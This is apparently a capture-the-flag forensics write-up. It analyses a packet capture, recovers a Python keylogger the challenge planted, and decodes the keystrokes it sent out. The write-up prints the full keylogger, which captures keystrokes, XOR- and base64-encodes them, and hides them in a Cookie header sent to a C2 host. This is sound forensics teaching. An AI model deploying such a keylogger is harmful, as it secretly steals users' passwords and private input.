# Packed Light

**Room Link**: <https://tryhackme.com/room/hh-packedlight-02e5330c>

## Room Info

Points: 60

Category: Forensics

Difficulty: Easy

### Task Files

- packed-light-forensics-1784224937659.zip
  - traffic.pcapng

## Writeup

### Situation

We are given a packet capture from a compromised host with suspicious traffic. The room provides some interesting information to help guide this investigation including:
- "Tiny packets. Odd hours. Suspiciously regular. Someone's smuggling out the data" (Concierge Briefing)
- "Somewhere in that traffic, a quiet little errand is running on a loop" (Concierge Briefing)
- "my laptop ping some random :8080 address every single second" (@0xMia's Story)
- "the request headers are giving 'not a real app' ngl" (@0xMia's Story)

From this we can gather that on 0xMia's Laptop some software is running which regularly sends requests to some host on port 8080 and those requests contain some data being exfiltrated.

### Initial PCAP Analysis

After opening `traffic.pcapng` in Wireshark, I applied the filter `tcp.dstport == 8080` which shows that our host has been communicating with the host `34.41.103.191` on port 8080 and regularly sends a HTTP GET request to it.

The first HTTP request pulls a file from the domain `byte-lotus-hotel.thm` called `updates.py`. I just opened the TCP Stream (Right click -> Follow -> TCP Stream) to view the scripts contents.

### Suspicious File Retrieved

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
This script confirms that the domain `byte-lotus-hotel.thm` is a C2 Server so this is an exfil script. More specifically it's a keylogger which:
1. takes the key 
2. xor encodes it with the hardcoded key `H0t3lSt@ff0NlyK3epS3cr3t!` 
3. base64 encodes the key 
4. Places it in the `Cookie` header as `hotel_sess_state`

It also adds `ByteLotusClient/1.1` to the User-Agent despite trying to make it look like Firefox?

### TShark Cookie Extraction

Now that we know the data is spread throughout these cookies I can use TShark to extract them

Command: `tshark -r traffic.pcapng -Y "tcp.dstport == 8080 && http.cookie" -T fields -e http.cookie > cookies.txt`
- -T allows us to return specific fields from the packet
- -e combined with -T allows us to specify which fields we want
- \> cookies.txt just puts the cookies in a file

### Decoding the Data

Now I just need to write a script to decrypt and reassemble the data. 

```python
import base64

KEY = "H0t3lSt@ff0NlyK3epS3cr3t!"

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def recvltr(b64_string):
    encrypted = base64.b64decode(b64_string)
    raw_bytes = xor(encrypted, KEY.encode('utf-8'))
    return raw_bytes.decode('utf-8')

with open("cookies.txt", "r") as fp:
    data = ""

    for line in fp:
        b64_data = line.strip().split("=", 1)[1]
        data += recvltr(b64_data)

    print(f"Data: {data}")
```

Breaking down the script:
1. We get the key which was hardcoded in the getkey() function in the exfil script
2. xor(data, key) is also taken from the exfil script since you can xor data with the same key to get the original message
3. recvltr() is just sendltr in reverse but without the http request
4. The final loop reads the lines from the tshark extraction and decode and reconstructs the original data

After running the script I got the following output:
`Data: THM{█████████████████}`

We can see that data being exfiltrated was actually the challenge flag!

